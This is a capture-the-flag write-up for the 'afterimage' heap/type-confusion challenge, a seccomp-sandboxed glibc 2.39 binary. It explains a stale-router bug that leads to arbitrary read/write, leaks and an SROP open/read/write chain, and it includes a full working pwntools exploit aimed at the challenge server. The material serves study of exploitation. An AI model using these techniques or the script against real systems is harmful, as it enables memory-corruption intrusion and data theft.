## afterimage — writeup (glibc 2.39, x86-64, ORW under seccomp)


### Result: full remote exploit. Chain = snapshot/restore type-repack → stale-router type confusion → arbitrary write → repeatable arbitrary R/W → PIE/libc/stack leaks → SROP ORW over main's saved return → open/read/write of the flag.
### Run: python3 solve.py REMOTE HOST=<ip> PORT=<port> (local: python3 solve.py, needs afterimage, libc.so.6, ld-linux-x86-64.so.2 in cwd).
```Target
    • Menu-driven "telemetry engine". Session ctx calloc(0x2a0); a mmap(0x2000) arena holds 64 object slots of 0x80 bytes (slot*0x80). Objects: Channel(1)/DataBuffer(2)/Transform(3)/Router(4). session[id+1] = object pointer (id→slot table).
    • Protections: Full RELRO, canary, NX, PIE, FORTIFY. Seccomp = blacklist: only execve/execveat are killed; open/openat/read/write/rt_sigreturn are allowed ⇒ solution is ORW, not a shell.
Root cause — the "afterimage"
```
>snapshot serializes live objects grouped by type (1→2→3→4). restore rebuilds them into fresh slots in that type-grouped order, so an object's arena slot changes across a checkpoint. A Router caches a raw fastpath offset to its target's slot plus a generation stamp that is always 0. After a restore the cached offset is stale: it points at whatever object now sits in that slot, and the gen==0 check is trivially satisfied. That is a classic stale-pointer type confusion — the router keeps pointing at the after-image of its old target.
>Empirical proof (before → after snap;restore), router linked to Ca@slot1:
```
before: slot0 Router  slot1 DataBuffer  slot2 Transform
after : slot0 DataBuffer slot1 Transform slot2 Router   (router.fastpath still 0x80 -> now Transform)
``
## Primitive 1 — arbitrary write
>Arrange the repack so the stale router points at a ChannelNode. dispatch on the fastpath treats the target as a DataBuffer: it reads cap at obj+0x14 and data ptr at obj+0x18, then memcpy(dataptr, packet, len). For a channel those two fields are bytes 4..7 and 8..15 of the channel name, which the attacker sets at creation. So:
>name = "ZZZZ" + p64(0xffffffff)[:4] + p64(target)[:6]   # cap=0xffffffff, dataptr=target
>dispatch(router, payload)   =>   memcpy(target, payload, len)   # ARBITRARY WRITE
```Constraint: the name passes through fgets (no \n) and strncpy (stops at \0), so the 6 significant target bytes must contain no 00/0a (the trailing 0000 of the address is the terminator). The dispatch payload is read() so it is byte-clean.
Repack recipe that lands router→channel: create Transform (leaks), Ca, Cb (channels), Router; link(router→Ca); snap(0);restore(0). After repack the router's cached 0x80 now indexes Cb, whose name is the write vector.
Primitive 2 — repeatable arbitrary R/W
Use one channel-write to set session[FAKE_ID+1] = L, where L is the data chunk of a DataBuffer created after restore (measured L = session + 0x350, stable). At L we stage a fake DataBuffer {type=2, size, cap=0x1000, dataptr=X} whose dataptr we edit through the host buffer. Then inspect(FAKE_ID) reads *X and edit(FAKE_ID) writes X — repeatable arbitrary read/write by just re-editing X.
```


## Leaks
    • PIE: Transform Handler ID (a .text pointer) − 0x1ba0.
    • session: first Transform Context Ref (its malloc(0x40) STET ctx) − 0x2b0.
    • libc: arbitrary-read PIE.got['puts'] → puts → base.
    • stack: arbitrary-read libc environ.
## RIP — SROP (no pop rdx in libc)
>libc 2.39 has pop rdi/rsi/rax and syscall;ret but no pop rdx, so ORW uses sigreturn (rt_sigreturn = 15, allowed by seccomp). main's saved return address (a pointer into __libc_start_call_main, i.e. < __libc_start_main) is located by scanning down from environ (robust to the remote's differing env). Overwrite it with three chained SROP frames:
>pop rax;15; syscall;ret ; SigretFrame(open("flag.txt",0))
>pop rax;15; syscall;ret ; SigretFrame(read(3, buf, 0x200))
>pop rax;15; syscall;ret ; SigretFrame(write(1, buf, 0x200))
>Choosing menu Exit makes main return into the chain. Remote flag path is /home/ctf/flag.txt (xinetd cwd = /); local is flag.txt.


## POC
```
#!/usr/bin/env python3
# afterimage — self-contained remote exploit (no local binary/libc needed).
# Just:  python3 solve_remote.py
#   or:  python3 solve_remote.py HOST=host PORT=port
#   local test: python3 solve_remote.py LOCAL
#
# Bug: snapshot serializes objects grouped by TYPE; restore repacks them into
# fresh slots in that order, so a Router's cached fastpath offset (gen stamp
# always 0) becomes a stale pointer -> type confusion. Pointed at a ChannelNode,
# the channel name becomes {cap,dataptr} -> arbitrary write -> arbitrary R/W ->
# leak PIE/libc/stack -> SROP open/read/write the flag (execve is seccomp-killed).
from pwn import *

context.update(arch='amd64', os='linux', log_level='info')
HOST = args.HOST or 'afterimage.chall.rootriet.in'
PORT = int(args.PORT or 31337)

# ---- constants baked from the handout (afterimage + libc 2.39-0ubuntu8.8) ----
GOT_PUTS  = 0x7f28      # PIE-relative GOT slot of puts
LIBC_PUTS = 0x87cc0     # libc-relative
LIBC_ENV  = 0x20ad58    # libc environ
LIBC_LSM  = 0x2a200     # libc __libc_start_main (defines the main-ret scan window)
G_POP_RAX = 0xdd337     # pop rax ; ret
G_SYSCALL = 0x99096     # syscall ; ret
HANDLER   = 0x1ba0      # PIE  = Transform HandlerID - 0x1ba0
CTX2SES   = 0x2b0       # session = first Transform CtxRef - 0x2b0
L_OFF     = 0x350       # post-restore host DataBuffer data = session + 0x350
FAKE_ID   = 10

# ---- interaction helpers ----
def start():
    if args.LOCAL:
        ld='./ld-linux-x86-64.so.2'
        if os.path.exists(ld):
            return process([ld, './afterimage'], env={'LD_LIBRARY_PATH':'.'})
        return process(['./afterimage'])
    return remote(HOST, PORT)
def m(p,c): p.recvuntil(b'> '); p.sendline(str(c).encode())
def c_chan(p,name,flags):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'1')
    p.recvuntil(b'Channel Name > '); p.send(name+b'\n')
    p.recvuntil(b'Routing Flags (hex/dec) > '); p.sendline(str(flags).encode()); p.recvuntil(b'\n')
def c_buf(p,cap,data=b''):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'2')
    p.recvuntil(b'Buffer Capacity > '); p.sendline(str(cap).encode())
    p.recvuntil(b'Initial Data Size > '); p.sendline(str(len(data)).encode())
    if data: p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'\n')
def c_trans(p,mode,tok):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'3')
    p.recvuntil(b') > '); p.sendline(str(mode).encode())
    p.recvuntil(b'Token (hex/dec) > '); p.sendline(str(tok).encode()); p.recvuntil(b'\n')
def c_router(p,t,s):
    m(p,1); p.recvuntil(b'Type > '); p.sendline(b'4')
    p.recvuntil(b'Target Logical ID > '); p.sendline(str(t).encode())
    p.recvuntil(b'Source Logical ID > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def link(p,r,t):
    m(p,4); p.recvuntil(b'Router ID > '); p.sendline(str(r).encode())
    p.recvuntil(b'Target Object ID > '); p.sendline(str(t).encode()); p.recvuntil(b'\n')
def edit(p,i,data):
    m(p,2); p.recvuntil(b'Object ID > '); p.sendline(str(i).encode())
    p.recvuntil(b'Data Size > '); p.sendline(str(len(data)).encode())
    p.recvuntil(b'> '); p.send(data); p.recvuntil(b'\n')
def snap(p,s): m(p,6); p.recvuntil(b'Slot (0-3) > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def restore(p,s): m(p,7); p.recvuntil(b'Slot (0-3) > '); p.sendline(str(s).encode()); p.recvuntil(b'\n')
def dispatch(p,r,data):
    m(p,8); p.recvuntil(b'Router ID > '); p.sendline(str(r).encode())
    p.recvuntil(b'Packet Length > '); p.sendline(str(len(data)).encode())
    p.recvuntil(b'> '); p.send(data); p.recvuntil(b'\n')
def inspect(p,i):
    m(p,5); p.recvuntil(b'Object ID > '); p.sendline(str(i).encode())
    return p.recvuntil(b'=== AFTERIMAGE', drop=True)
def insp_transform(p,i):
    d=inspect(p,i)
    return (int(d.split(b'Handler ID : ')[1].split(b'\n')[0],16),
            int(d.split(b'Context Ref: ')[1].split(b'\n')[0],16))
def payload_hex(d):
    return bytes.fromhex(d.split(b'Payload Hex: ')[1].split(b'\n')[0].strip().decode())
def bad(b): return b'\x00' in b or b'\n' in b

def attempt():
    p=start()
    # === leak PIE + session ===
    c_trans(p,1,0xdead)
    hid,ctx=insp_transform(p,1)
    pie=hid-HANDLER; session=ctx-CTX2SES
    log.info('PIE=%#x session=%#x', pie, session)
    L=session+L_OFF; wt=session+8+FAKE_ID*8

    # === stale-router arbitrary-write via type-repack ===
    cbname=b'ZZZZ'+p32(0xffffffff)+p64(wt)[:6]
    if bad(cbname): raise ValueError('unlucky ASLR bytes')
    c_chan(p,b'AAAA',0)                 # id2 Ca
    c_chan(p,cbname,0)                  # id3 Cb (name = write vector after repack)
    c_router(p,0,0)                     # id4 R
    link(p,4,2)                         # R.fastpath = Ca slot (0x80)
    snap(p,0); restore(p,0)            # repack: slot1 -> Cb ; R points at a channel

    # host DataBuffer for the fake object (after restore so it survives)
    fake0=flat({0:p32(FAKE_ID)+p16(2)+p16(1),0x10:p32(0x20)+p32(0x1000),
                0x18:p64(pie+GOT_PUTS)}, length=0x40, filler=b'\x00')
    c_buf(p,0x1000,fake0)               # id5, data at L
    dispatch(p,4,p64(L))               # one-shot: session[FAKE_ID+1] = L

    # === repeatable arbitrary R/W via fake DataBuffer at L ===
    def set_ptr(a,cap=0x1000):
        edit(p,5,flat({0:p32(FAKE_ID)+p16(2)+p16(1),0x10:p32(0x20)+p32(cap),
                       0x18:p64(a)}, length=0x40, filler=b'\x00'))
    def aread(a): set_ptr(a); return payload_hex(inspect(p,FAKE_ID))
    def awrite(a,d): set_ptr(a,max(0x1000,len(d)+0x10)); edit(p,FAKE_ID,d)

    puts=u64(aread(pie+GOT_PUTS)[:8]); libc=puts-LIBC_PUTS
    if libc & 0xfff: raise ValueError('libc misaligned (remote libc mismatch?)')
    log.info('libc=%#x', libc)
    # environ lives in libc .bss whose offset drifts between glibc patch levels
    # (puts/.text matched, so only .bss shifted). Find a stack pointer robustly.
    def is_stk(v): return 0x7ff000000000 <= v < 0x800000000000
    env=0
    for eo in (LIBC_ENV, 0x20bd58, 0x209d58, 0x20cd58, 0x208d58, 0x20dd58):
        v=u64(aread(libc+eo)[:8])
        if is_stk(v): env=v; break
    if not env:                                  # page-scan fallback (offset ...d58 is stable)
        for pg in range(0x204000, 0x218000, 0x1000):
            blk=aread(libc+pg+0xd40)             # 32B -> covers ...d40/48/50/58
            for i in range(0,32,8):
                v=u64(blk[i:i+8])
                if is_stk(v): env=v; break
            if env: break
    if not env: raise ValueError('no stack pointer found (environ)')
    log.info('libc=%#x env=%#x', libc, env)

    # === locate main saved RIP (return into __libc_start_call_main) by scan ===
    lsm=libc+LIBC_LSM; S=None; base=(env & ~0xf)
    for off in range(0x40,0x3000,0x20):
        blk=aread(base-off)                      # 32B = 4 qwords per roundtrip
        for i in range(0,32,8):
            v=u64(blk[i:i+8])
            if lsm-0x400<=v<lsm: S=base-off+i; break
        if S: break
    if not S: raise ValueError('main ret not found')
    log.info('main ret slot=%#x (env-%#x)', S, env-S)

    # === SROP open/read/write ===
    sc=libc+G_SYSCALL; pr=libc+G_POP_RAX
    trig=p64(pr)+p64(15)+p64(sc); F=len(bytes(SigreturnFrame()))
    o_fo=0x18; o_t2=o_fo+F; o_fr=o_t2+0x18; o_t3=o_fr+F; o_fw=o_t3+0x18; o_path=o_fw+F
    path=(b'flag.txt' if args.LOCAL else b'/home/ctf/flag.txt')+b'\x00'
    path_addr=S+o_path; buf=S-0x600
    def frame(rax,rdi,rsi,rdx,rsp):
        f=SigreturnFrame(); f.rax=rax; f.rdi=rdi; f.rsi=rsi; f.rdx=rdx; f.rip=sc; f.rsp=rsp; return bytes(f)
    blob=(trig+frame(2,path_addr,0,0,S+o_t2)      # open(path,0,0)
              +trig+frame(0,3,buf,0x200,S+o_t3)   # read(3,buf,0x200)
              +trig+frame(1,1,buf,0x200,S+o_path) # write(1,buf,0x200)
              +path)
    awrite(S,blob)
    m(p,0)                                          # Exit -> main returns -> ROP
    out=p.recvall(timeout=8); p.close(); return out

def go():
    for i in range(16):
        try: out=attempt()
        except (EOFError,ValueError,IndexError) as e:
            log.warning('attempt %d: %s — retry', i, e); continue
        if out:
            for line in out.split(b'\n'):
                if b'{' in line and b'}' in line:
                    log.success('FLAG: %s', line.strip().decode('latin1')); return
        log.warning('attempt %d: no flag — retry', i)
    log.failure('exhausted retries')

go()

```

## Key offsets (from the provided binary/libc; verified stable)
>PIE   = HandlerID - 0x1ba0        session = CtxRef - 0x2b0     L = session + 0x350
>gadgets(libc): pop rax;ret=0xdd337  syscall;ret=0x99096
>mainret value = libc + 0x2a1ca  (scanned, in __libc_start_call_main)




## FLAG
<img width="541" height="171" alt="image" src="https://github.com/user-attachments/assets/bbf7614e-cfd7-400b-94fc-3c4cbac5b154" />

